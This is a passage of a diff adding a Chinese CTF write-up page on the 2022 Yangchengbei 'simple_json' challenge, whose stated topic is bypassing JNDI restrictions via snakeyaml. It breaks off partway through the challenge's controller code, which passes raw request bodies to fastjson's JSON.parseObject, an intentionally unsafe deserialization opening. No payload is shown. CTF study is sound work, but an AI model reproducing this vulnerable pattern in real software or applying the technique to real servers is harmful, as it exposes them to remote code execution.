@@ -1,0 +1,519 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><meta charset="utf-8" />
+  <meta name="generator" content="Hugo 0.134.0">
+
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="Snakinya" />
+  <meta property="og:url" content="https://www.snakin.top/posts/2022%E7%BE%8A%E5%9F%8E%E6%9D%AF/" />
+  <link rel="canonical" href="https://www.snakin.top/posts/2022%E7%BE%8A%E5%9F%8E%E6%9D%AF/" /><link rel="apple-touch-icon" href="https://www.snakin.top/favicon.ico" />
+  <link rel="icon" href="https://www.snakin.top/favicon.ico" />
+  <link rel="shortcut" href="https://www.snakin.top/favicon.ico" /><link rel="alternate" type="application/atom+xml" href="https://www.snakin.top/index.xml" title="Snakinya-明烛天南">
+
+  <script type="application/ld+json">
+  {
+      "@context" : "http://schema.org",
+      "@type" : "BlogPosting",
+      "mainEntityOfPage": {
+           "@type": "WebPage",
+           "@id": "https:\/\/www.snakin.top\/"
+      },
+      "articleSection" : "posts",
+      "name" : "CTF | 2022羊城杯 simple_json",
+      "headline" : "CTF | 2022羊城杯 simple_json",
+      "description" : "simple_json 考点： snakeyaml绕过高版本jndi\n解题 给了一个jar包，看一下controller\npackage ycb.simple_json.controller; import com.alibaba.fastjson.JSON; import java.io.IOException; import javax.servlet.ServletInputStream; import javax.servlet.http.HttpServletRequest; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.PostMapping; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RestController; import ycb.simple_json.message.Message; import ycb.simple_json.service.ApiTestService; @RestController @RequestMapping({\u0026#34;\/ApiTest\u0026#34;}) public class JsonApiTestController { @Autowired private ApiTestService apiTestService; public JsonApiTestController() { } @GetMapping({\u0026#34;\/get\u0026#34;}) public String getApiTest() { return this.apiTestService.getMsg().toString(); } @PostMapping({\u0026#34;\/post\u0026#34;}) public String postApiTest(HttpServletRequest request) { ServletInputStream inputStream = null; String jsonStr = null; try { inputStream = request.getInputStream(); StringBuffer stringBuffer = new StringBuffer(); byte[] buf = new byte[1024]; int len = false; int len; while((len = inputStream.read(buf)) != -1) { stringBuffer.append(new String(buf, 0, len)); } inputStream.close(); jsonStr = stringBuffer.toString(); return ((Message)JSON.parseObject(jsonStr, Message.class)).toString(); } catch (IOException var7) { var7.printStackTrace(); return \u0026#34;Test fail\u0026#34;; } } } ",
+      "inLanguage" : "en-US",
+      "author" : "Snakinya",
+      "creator" : "Snakinya",
+      "publisher": "Snakinya",
+      "accountablePerson" : "Snakinya",
+      "copyrightHolder" : "Snakinya",
+      "copyrightYear" : "2022",
+      "datePublished": "2022-09-14 00:00:00 \u002b0000 UTC",
+      "dateModified" : "2022-09-14 00:00:00 \u002b0000 UTC",
+      "url" : "https:\/\/www.snakin.top\/posts\/2022%E7%BE%8A%E5%9F%8E%E6%9D%AF\/",
+      "keywords" : [  ]
+  }
+</script>
+<title>CTF | 2022羊城杯 simple_json</title>
+  <meta property="og:title" content="CTF | 2022羊城杯 simple_json" />
+  <meta property="og:type" content="article" />
+  <meta property="og:description" content="simple_json 考点： snakeyaml绕过高版本jndi
+解题 给了一个jar包，看一下controller
+package ycb.simple_json.controller; import com.alibaba.fastjson.JSON; import java.io.IOException; import javax.servlet.ServletInputStream; import javax.servlet.http.HttpServletRequest; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.PostMapping; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RestController; import ycb.simple_json.message.Message; import ycb.simple_json.service.ApiTestService; @RestController @RequestMapping({&#34;/ApiTest&#34;}) public class JsonApiTestController { @Autowired private ApiTestService apiTestService; public JsonApiTestController() { } @GetMapping({&#34;/get&#34;}) public String getApiTest() { return this.apiTestService.getMsg().toString(); } @PostMapping({&#34;/post&#34;}) public String postApiTest(HttpServletRequest request) { ServletInputStream inputStream = null; String jsonStr = null; try { inputStream = request.getInputStream(); StringBuffer stringBuffer = new StringBuffer(); byte[] buf = new byte[1024]; int len = false; int len; while((len = inputStream.read(buf)) != -1) { stringBuffer.append(new String(buf, 0, len)); } inputStream.close(); jsonStr = stringBuffer.toString(); return ((Message)JSON.parseObject(jsonStr, Message.class)).toString(); } catch (IOException var7) { var7.printStackTrace(); return &#34;Test fail&#34;; } } } " />
+  <meta name="description" content="simple_json 考点： snakeyaml绕过高版本jndi
+解题 给了一个jar包，看一下controller
+package ycb.simple_json.controller; import com.alibaba.fastjson.JSON; import java.io.IOException; import javax.servlet.ServletInputStream; import javax.servlet.http.HttpServletRequest; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.PostMapping; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RestController; import ycb.simple_json.message.Message; import ycb.simple_json.service.ApiTestService; @RestController @RequestMapping({&#34;/ApiTest&#34;}) public class JsonApiTestController { @Autowired private ApiTestService apiTestService; public JsonApiTestController() { } @GetMapping({&#34;/get&#34;}) public String getApiTest() { return this.apiTestService.getMsg().toString(); } @PostMapping({&#34;/post&#34;}) public String postApiTest(HttpServletRequest request) { ServletInputStream inputStream = null; String jsonStr = null; try { inputStream = request.getInputStream(); StringBuffer stringBuffer = new StringBuffer(); byte[] buf = new byte[1024]; int len = false; int len; while((len = inputStream.read(buf)) != -1) { stringBuffer.append(new String(buf, 0, len)); } inputStream.close(); jsonStr = stringBuffer.toString(); return ((Message)JSON.parseObject(jsonStr, Message.class)).toString(); } catch (IOException var7) { var7.printStackTrace(); return &#34;Test fail&#34;; } } } " />
+  <meta property="og:locale" content="cn" /><meta property="og:image" content="https://www.snakin.top/favicon.ico" />
+  
+
+  
+    <style>.highlight{position:relative}.clipboard-button{color:var(--white);background-color:rgba(255,255,255,.786);border:none;border-radius:6px;padding:3px 5px 2px;font-size:1rem;position:absolute;z-index:1;right:0;top:0;margin:10px;transition:.1s;opacity:.5}.clipboard-button>svg{fill:var(--white)}.clipboard-button:hover,.clipboard-button:focus,pre:active~.clipboard-button,pre:focus~.clipboard-button,div.highlight:active>.clipboard-button,div.highlight:focus>.clipboard-button{cursor:pointer;opacity:1}</style>
+  
+  
+    <style>@import "https://cdnjs.cloudflare.com/ajax/libs/lxgw-wenkai-screen-webfont/1.7.0/lxgwwenkaiscreenr.css";.busuanzi-footer{font-size:14px;color:#666;display:inline-block;gap:10px;align-items:center}.busuanzi-footer .separator{margin:0 5px;color:#999}.footer-beian{font-size:12px;color:#999;margin-top:5px;text-align:center}.footer-beian a{color:#0073e6;text-decoration:none}.footer-beian a:hover{text-decoration:underline}body{font-family:lxgw wenkai screen r,bree serif,sans-serif;-webkit-font-smoothing:antialiased;margin:0 20px}article{max-width:40%;min-width:800px;margin-left:auto;margin-right:auto}a{color:#000;text-decoration:none;word-break:break-all}a:hover{font-weight:600;text-decoration:underline}.post-ads{margin:50px 0}.markdown-body{font-size:18px;max-width:100%}.markdown-body a{text-decoration:underline;text-decoration-color:#000}.markdown-body blockquote{margin:0;padding:0 1em;color:#57606a;border-left:.25em solid #d0d7de}.markdown-body pre{padding:1px;font-size:16px;font-weight:550;font-family:Consolas,Monaco,Menlo,Consolas,monospace;word-break:break-all;word-wrap:break-word;overflow-y:auto;max-height:300px}.markdown-body code{padding:.2em .4em;font-size:85%;background-color:#f6f8fa;border-radius:6px;text-size-adjust:100%;-ms-text-size-adjust:100%;-moz-text-size-adjust:100%;-webkit-text-size-adjust:100%}.markdown-body pre>code{padding:0;font-size:100%;background-color:inherit;border:0}.Chinese .markdown-body{line-height:150%}.site-date-catalog{font-size:2rem}.header-title{font-size:1.5rem;font-weight:700;margin-top:32px;font-family:bungee shade,sans-serif}.header-title a{text-decoration:none}.header-subtitle{color:#666}.header-items{margin:10px 0}.header-item{margin:0 5px;font-weight:700}.header-item a:hover{font-weight:700;color:#8a2be2}.header-item a:visited{font-weight:700}.header-item a:active{font-weight:700}.header-line{width:100%;border-width:2px;border-color:#482936;border-style:solid none none none}.lang-switch{font-weight:600}#posts-list{min-height:600px}.posts-line{font-size:1.2rem;margin:12px 0}.posts-categories{font-size:.8rem;margin:auto;text-align:center}.posts-category{padding:3px 0;border:#000 2px solid;border-radius:5px}.site-footer{margin-top:50px;text-align:center}.site-footer-item{margin-right:12px}.post-content img{max-width:100%;display:block;margin-right:auto;margin-top:12px}.post-header{margin-bottom:50px}.post-title{font-size:2rem;font-weight:600}.post-tags{display:inline;font-weight:600;padding:2px 5px;margin-right:6px;border:#000 2px solid;border-radius:5px}.post-date{font-weight:800;font-style:italic}.post-author{float:right;font-weight:600}.page-content{min-height:60%}.post-content{margin-bottom:50px}.post-content p{hyphens:auto;line-height:1.8;text-justify:ideographic;margin-bottom:1em}.related-content{border-width:3px;border-style:solid;border-color:#000;padding:0 10px;margin-bottom:50px;margin-top:100px}.related-content li{margin:5px 0}.taxonomy-term{font-size:3rem}.gallery-img{text-align:center}.gallery-img span{text-align:center}.gallery-img-desc{font-size:.8em;font-weight:800}#disqus_thread{position:relative}#disqus_thread:after{content:"";display:block;height:55px;width:100%;position:absolute;bottom:0;background:#fff}@media screen and (max-width:600px){article{max-width:100%;min-width:300px}.header-title,.header-subtitle,.header-items{text-align:center}.posts-line{font-size:16px}.markdown-body{font-size:16px}.post-title{font-size:2rem}.post-content p{letter-spacing:.05em}}@media screen and (max-width:48em){.posts-category{display:none}}table{width:100%;color:#333;border-width:1px;border-color:#666;border-collapse:collapse}table th{border-width:1px;padding:8px;border-style:solid;border-color:#666;background-color:#dedede}table td{border-width:1px;padding:8px;border-style:solid;border-color:#666;background-color:#fff}.post-content a{color:#0969da;box-shadow:none;text-decoration:none}a:hover{font-weight:400}.post-content a:hover{text-decoration:underline}.footnotes{> hr { display: none; }}.footnotes ol{line-height:1.4;margin-bottom:20px}.footnotes li{margin-bottom:5px}.footnotes ol li p{margin:0;padding:0;line-height:1.4}.donation{display:block;margin-left:auto;margin-right:auto}</style>
+  
+  
+    <style>.container,.container-fluid{margin-right:auto;margin-left:auto}.container-fluid{padding-right:2rem;padding-left:2rem}.row{box-sizing:border-box;display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-flex:0;-ms-flex:0 1 auto;flex:initial;-webkit-box-orient:horizontal;-webkit-box-direction:normal;-ms-flex-direction:row;flex-direction:row;-ms-flex-wrap:wrap;flex-wrap:wrap;margin-right:-.5rem;margin-left:-.5rem}.row.reverse{-webkit-box-orient:horizontal;-webkit-box-direction:reverse;-ms-flex-direction:row-reverse;flex-direction:row-reverse}.col.reverse{-webkit-box-orient:vertical;-webkit-box-direction:reverse;-ms-flex-direction:column-reverse;flex-direction:column-reverse}.col-xs,.col-xs-1,.col-xs-10,.col-xs-11,.col-xs-12,.col-xs-2,.col-xs-3,.col-xs-4,.col-xs-5,.col-xs-6,.col-xs-7,.col-xs-8,.col-xs-9,.col-xs-offset-0,.col-xs-offset-1,.col-xs-offset-10,.col-xs-offset-11,.col-xs-offset-12,.col-xs-offset-2,.col-xs-offset-3,.col-xs-offset-4,.col-xs-offset-5,.col-xs-offset-6,.col-xs-offset-7,.col-xs-offset-8,.col-xs-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-xs{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-xs-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-xs-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-xs-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-xs-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-xs-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-xs-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-xs-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-xs-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-xs-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-xs-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-xs-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-xs-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-xs-offset-0{margin-left:0}.col-xs-offset-1{margin-left:8.33333333%}.col-xs-offset-2{margin-left:16.66666667%}.col-xs-offset-3{margin-left:25%}.col-xs-offset-4{margin-left:33.33333333%}.col-xs-offset-5{margin-left:41.66666667%}.col-xs-offset-6{margin-left:50%}.col-xs-offset-7{margin-left:58.33333333%}.col-xs-offset-8{margin-left:66.66666667%}.col-xs-offset-9{margin-left:75%}.col-xs-offset-10{margin-left:83.33333333%}.col-xs-offset-11{margin-left:91.66666667%}.start-xs{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-xs{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-xs{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-xs{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-xs{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-xs{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-xs{-ms-flex-pack:distribute;justify-content:space-around}.between-xs{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-xs{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-xs{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}@media only screen and (min-width:48em){.container{width:49rem}.col-sm,.col-sm-1,.col-sm-10,.col-sm-11,.col-sm-12,.col-sm-2,.col-sm-3,.col-sm-4,.col-sm-5,.col-sm-6,.col-sm-7,.col-sm-8,.col-sm-9,.col-sm-offset-0,.col-sm-offset-1,.col-sm-offset-10,.col-sm-offset-11,.col-sm-offset-12,.col-sm-offset-2,.col-sm-offset-3,.col-sm-offset-4,.col-sm-offset-5,.col-sm-offset-6,.col-sm-offset-7,.col-sm-offset-8,.col-sm-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-sm{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-sm-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-sm-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-sm-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-sm-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-sm-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-sm-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-sm-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-sm-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-sm-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-sm-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-sm-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-sm-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-sm-offset-0{margin-left:0}.col-sm-offset-1{margin-left:8.33333333%}.col-sm-offset-2{margin-left:16.66666667%}.col-sm-offset-3{margin-left:25%}.col-sm-offset-4{margin-left:33.33333333%}.col-sm-offset-5{margin-left:41.66666667%}.col-sm-offset-6{margin-left:50%}.col-sm-offset-7{margin-left:58.33333333%}.col-sm-offset-8{margin-left:66.66666667%}.col-sm-offset-9{margin-left:75%}.col-sm-offset-10{margin-left:83.33333333%}.col-sm-offset-11{margin-left:91.66666667%}.start-sm{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-sm{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-sm{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-sm{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-sm{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-sm{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-sm{-ms-flex-pack:distribute;justify-content:space-around}.between-sm{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-sm{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-sm{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}}@media only screen and (min-width:64em){.container{width:65rem}.col-md,.col-md-1,.col-md-10,.col-md-11,.col-md-12,.col-md-2,.col-md-3,.col-md-4,.col-md-5,.col-md-6,.col-md-7,.col-md-8,.col-md-9,.col-md-offset-0,.col-md-offset-1,.col-md-offset-10,.col-md-offset-11,.col-md-offset-12,.col-md-offset-2,.col-md-offset-3,.col-md-offset-4,.col-md-offset-5,.col-md-offset-6,.col-md-offset-7,.col-md-offset-8,.col-md-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-md{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-md-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-md-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-md-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-md-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-md-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-md-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-md-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-md-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-md-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-md-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-md-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-md-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-md-offset-0{margin-left:0}.col-md-offset-1{margin-left:8.33333333%}.col-md-offset-2{margin-left:16.66666667%}.col-md-offset-3{margin-left:25%}.col-md-offset-4{margin-left:33.33333333%}.col-md-offset-5{margin-left:41.66666667%}.col-md-offset-6{margin-left:50%}.col-md-offset-7{margin-left:58.33333333%}.col-md-offset-8{margin-left:66.66666667%}.col-md-offset-9{margin-left:75%}.col-md-offset-10{margin-left:83.33333333%}.col-md-offset-11{margin-left:91.66666667%}.start-md{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-md{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-md{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-md{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-md{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-md{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-md{-ms-flex-pack:distribute;justify-content:space-around}.between-md{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-md{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-md{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}}@media only screen and (min-width:75em){.container{width:76rem}.col-lg,.col-lg-1,.col-lg-10,.col-lg-11,.col-lg-12,.col-lg-2,.col-lg-3,.col-lg-4,.col-lg-5,.col-lg-6,.col-lg-7,.col-lg-8,.col-lg-9,.col-lg-offset-0,.col-lg-offset-1,.col-lg-offset-10,.col-lg-offset-11,.col-lg-offset-12,.col-lg-offset-2,.col-lg-offset-3,.col-lg-offset-4,.col-lg-offset-5,.col-lg-offset-6,.col-lg-offset-7,.col-lg-offset-8,.col-lg-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-lg{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-lg-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-lg-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-lg-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-lg-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-lg-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-lg-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-lg-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-lg-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-lg-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-lg-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-lg-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-lg-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-lg-offset-0{margin-left:0}.col-lg-offset-1{margin-left:8.33333333%}.col-lg-offset-2{margin-left:16.66666667%}.col-lg-offset-3{margin-left:25%}.col-lg-offset-4{margin-left:33.33333333%}.col-lg-offset-5{margin-left:41.66666667%}.col-lg-offset-6{margin-left:50%}.col-lg-offset-7{margin-left:58.33333333%}.col-lg-offset-8{margin-left:66.66666667%}.col-lg-offset-9{margin-left:75%}.col-lg-offset-10{margin-left:83.33333333%}.col-lg-offset-11{margin-left:91.66666667%}.start-lg{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-lg{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-lg{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-lg{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-lg{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-lg{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-lg{-ms-flex-pack:distribute;justify-content:space-around}.between-lg{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-lg{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-lg{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}}</style>
+  
+  
+    <style>.toc{background-color:#f5f5f5;margin:0 auto;width:90%;border-radius:8px;padding:20px;box-shadow:0 4px 6px rgba(0,0,0,.1)}.toc ul{padding-left:20px}.toc li{line-height:1.6;margin-bottom:0}.toc li a{color:#333}.toc li a:hover{color:#000}.toc details{cursor:pointer}.toc summary{font-weight:700}.toc .inner{margin:0 0 0 20px;padding:0 15px 15px 20px;padding-bottom:0;font-size:16px;max-height:83vh;overflow-y:auto}</style>
+  
+
+  
+
+  <link href="/index.xml" rel="alternate" type="application/rss+xml"
+    title="Snakinya-明烛天南">
+  
+  <link rel="preconnect" href="https://fonts.gstatic.com">
+  <link href="https://fonts.googleapis.com/css?family=Bree+Serif|Bungee+Shade" rel="stylesheet">
+  
+  
+
+
+
+
+
+  
+  
+</head>
+
+
+<body>
+  <article class="post Chinese" id="article">
+    <div class="row">
+      <div class="col-xs-12">
+        <div class="site-header">
+          
+<header>
+  
+  <div class="header-title">
+    <a href="/"
+      >Snakinya</a
+    >
+  </div>
+  <div class="header-subtitle" style="color:blueviolet;">苍山负雪，明烛天南</div>
+</header>
+
+<div class="row end-md center-xs header-items">
+  
+  <div class="header-item">
+    <a href="https://github.com/Snakinya" target="_self">Github</a>
+  </div>
+  
+  <div class="header-item">
+    <a href="/categories" target="_self">Categories</a>
+  </div>
+  
+  <div class="header-item">
+    <a href="/about/" target="_self">About</a>
+  </div>
+  
+  <div class="header-item">
+    <a href="/books/" target="_self">Books</a>
+  </div>
+  
+  <div class="header-item">
+    <a href="/friends/" target="_self">Friends</a>
+  </div>
+  
+  <div class="header-item">
+    <a href="/posts/" target="_self">Posts</a>
+  </div>
+  
+</div>
+
+<div class="header-line"></div>
+
+        </div>
+
+        <header class="post-header">
+          <h1 class="post-title">CTF | 2022羊城杯 simple_json</h1>
+          
+          <div class="row post-desc">
+            <div class="col-xs-6">
+              
+              <time class="post-date" datetime="2022-09-14 00:00:00 UTC">
+                14 Sep 2022
+              </time>
+              
+            </div>
+            
+            <div class="col-xs-6">
+
+              
+              <div class="post-author">
+              <span id="busuanzi_container_page_pv">@本文阅读量<span id="busuanzi_value_page_pv"></span>次</span>
+                
+            </div>
+          </div>
+          
+        </header>
+        
+
+        <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#simple_json" aria-label="simple_json">simple_json</a></li>
+                <li>
+                    <a href="#%e8%80%83%e7%82%b9" aria-label="考点：">考点：</a></li>
+                <li>
+                    <a href="#%e8%a7%a3%e9%a2%98" aria-label="解题">解题</a><ul>
+                        
+                <li>
+                    <a href="#%e6%b3%a8%e6%84%8f" aria-label="注意">注意</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+        
+
+
+
+        <div class="post-content markdown-body">
+          
+          <h3 id="simple_json">simple_json</h3>
+<h3 id="考点">考点：</h3>
+<p>snakeyaml绕过高版本jndi</p>
+<h3 id="解题">解题</h3>
+<p>给了一个jar包，看一下controller</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff6ac1">package</span> ycb.simple_json.controller;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> com.alibaba.fastjson.JSON;
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> java.io.IOException;
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> javax.servlet.ServletInputStream;
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> javax.servlet.http.HttpServletRequest;
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> org.springframework.beans.factory.annotation.Autowired;
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> org.springframework.web.bind.annotation.GetMapping;
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> org.springframework.web.bind.annotation.PostMapping;
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> org.springframework.web.bind.annotation.RequestMapping;
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> org.springframework.web.bind.annotation.RestController;
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> ycb.simple_json.message.Message;
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> ycb.simple_json.service.ApiTestService;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff9f43">@RestController</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff9f43">@RequestMapping</span>({<span style="color:#5af78e">&#34;/ApiTest&#34;</span>})
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">public</span> <span style="color:#ff5c57">class</span> <span style="color:#f3f99d">JsonApiTestController</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff9f43">@Autowired</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">private</span> ApiTestService apiTestService;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">public</span> <span style="color:#57c7ff">JsonApiTestController</span>() {
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff9f43">@GetMapping</span>({<span style="color:#5af78e">&#34;/get&#34;</span>})
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">public</span> String <span style="color:#57c7ff">getApiTest</span>() {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">return</span> <span style="color:#ff6ac1">this</span>.<span style="color:#57c7ff">apiTestService</span>.<span style="color:#57c7ff">getMsg</span>().<span style="color:#57c7ff">toString</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
